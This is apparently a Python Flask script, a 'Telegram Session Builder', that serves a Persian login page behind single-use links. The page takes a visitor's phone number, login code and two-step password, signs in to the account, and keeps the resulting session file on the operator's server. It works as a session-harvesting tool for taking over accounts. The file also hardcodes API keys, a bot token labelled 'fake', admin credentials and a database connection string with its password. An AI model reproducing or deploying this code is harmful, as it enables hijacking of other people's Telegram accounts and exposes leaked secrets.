# ================================================================
# Telegram Session Builder – FULL FINAL VERSION (ANTI SLEEP)
# By: Tiam
# ================================================================

import os, asyncio, threading, secrets, time, shutil
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient
from datetime import datetime
import requests

# ===================== CONFIG ===================================
self_config = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam.",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions",
    "base_url": "https://anime-1127-bot-2.onrender.com",
    "fake_bot_token": "8569519729:AAG2ZLf5xn_2pNtuGDaXF_y_88SU-dqUnis"
}

os.makedirs(self_config["save_path"], exist_ok=True)

# ===================== MongoDB ==================================
mongo = MongoClient(
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)
db = mongo.telegram_sessions
sessions_col = db.sessions
links_col = db.links

# ===================== Flask ====================================
app = Flask(__name__, static_url_path="/static", static_folder="static")

# ===================== Async Loop ================================
loop = asyncio.new_event_loop()
threading.Thread(
    target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()),
    daemon=True
).start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

# ===================== Utils ====================================
def gen_token():
    return secrets.token_urlsafe(8)

def consume_link(token):
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

def normalize_phone(phone):
    phone = phone.strip()
    if phone.startswith("0"):
        return "+98" + phone[1:]
    if phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    return phone

def delete_session(phone):
    path = os.path.join(self_config["save_path"], phone)
    if os.path.exists(path):
        shutil.rmtree(path)
    sessions_col.delete_one({"phone": phone})

# ===================== HTML =====================================
HTML_PAGE = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>Telegram Session Builder</title>
<style>
body {
    background: url('/static/images/bg.jpg') no-repeat center center fixed;
    background-size: cover;
    color: white;
    font-family: tahoma;
}
.box {
    width:360px;
    margin:120px auto;
    padding:25px;
    background: rgba(15,23,42,0.88);
    border-radius:16px;
    text-align:center;
}
input, button {
    padding:12px;
    margin-top:10px;
    border-radius:10px;
    border:none;
    width:100%;
}
button {
    background:#6366f1;
    color:white;
}
#s2,#s3,#done { display:none; }
</style>
</head>
<body>

<div class="box">
<h3>ساخت سشن تلگرام</h3>

<input id="phone" placeholder="شماره تلفن">
<button id="mainBtn" onclick="checkPhone()">دریافت کد</button>

<div id="s2">
<input id="code" placeholder="کد تلگرام">
<button onclick="sendCode()">تأیید کد</button>
</div>

<div id="s3">
<input id="password" type="password" placeholder="رمز دو مرحله‌ای">
<button onclick="sendPassword()">تأیید رمز</button>
</div>

<div id="done">
<h3>✅ سشن ساخته شد</h3>
</div>
</div>

<script>
let phone = "";

function checkPhone(){
    phone = phoneInput().value;
    fetch("/check_phone",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone})
    })
    .then(r=>r.json())
    .then(d=>{
        if(d.status==="exists"){
            mainBtn().innerText = "حذف سشن قبلی";
            mainBtn().onclick = deleteSession;
        } else {
            sendPhone();
        }
    });
}

function deleteSession(){
    fetch("/delete_session",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone})
    })
    .then(()=> {
        alert("سشن قبلی حذف شد");
        mainBtn().innerText = "دریافت کد";
        mainBtn().onclick = checkPhone;
    });
}

function sendPhone(){
    fetch("/send_phone",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone})
    })
    .then(r=>r.json())
    .then(()=>{
        document.getElementById("s2").style.display="block";
    });
}

function sendCode(){
    fetch("/send_code",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone, code: codeInput().value})
    })
    .then(r=>r.json())
    .then(d=>{
        if(d.status==="2fa"){
            s2().style.display="none";
            s3().style.display="block";
        }
        if(d.status==="ok") finish();
    });
}

function sendPassword(){
    fetch("/send_password",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone, password: passwordInput().value})
    })
    .then(()=>finish());
}

function finish(){
    s2().style.display="none";
    s3().style.display="none";
    mainBtn().style.display="none";
    done().style.display="block";
}

function phoneInput(){ return document.getElementById("phone"); }
function codeInput(){ return document.getElementById("code"); }
function passwordInput(){ return document.getElementById("password"); }
function mainBtn(){ return document.getElementById("mainBtn"); }
function s2(){ return document.getElementById("s2"); }
function s3(){ return document.getElementById("s3"); }
function done(){ return document.getElementById("done"); }

setInterval(()=>fetch("/ping"),240000);
</script>

</body>
</html>
"""

# ===================== Routes ===================================
@app.route("/")
def home():
    key = request.args.get("key")
    if not key or not consume_link(key):
        return "❌ لینک منقضی یا نامعتبر"
    return render_template_string(HTML_PAGE)

@app.route("/bot")
def bot_entry():
    return redirect("/")

@app.route("/ping")
def ping():
    return "OK"

@app.route("/check_phone", methods=["POST"])
def check_phone():
    phone = normalize_phone(request.json["phone"])
    return jsonify(status="exists" if sessions_col.find_one({"phone": phone}) else "ok")

@app.route("/delete_session", methods=["POST"])
def delete_session_route():
    delete_session(normalize_phone(request.json["phone"]))
    return jsonify(status="ok")

# ===================== Telethon ================================
clients = {}

async def create_client(phone):
    client = TelegramClient(
        os.path.join(self_config["save_path"], phone),
        self_config["api_id"],
        self_config["api_hash"]
    )
    await client.connect()
    return client

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = normalize_phone(request.json["phone"])
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(status="ok")

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = normalize_phone(request.json["phone"])
    try:
        run_async(clients[phone].sign_in(phone, request.json["code"]))
        sessions_col.insert_one({"phone": phone})
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_password():
    phone = normalize_phone(request.json["phone"])
    run_async(clients[phone].sign_in(password=request.json["password"]))
    sessions_col.insert_one({"phone": phone})
    return jsonify(status="ok")

# ===================== KEEP ALIVE ================================
def keep_alive():
    while True:
        try:
            requests.get(self_config["base_url"] + "/ping", timeout=10)
        except:
            pass
        time.sleep(240)

threading.Thread(target=keep_alive, daemon=True).start()

# ===================== RUN ======================================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
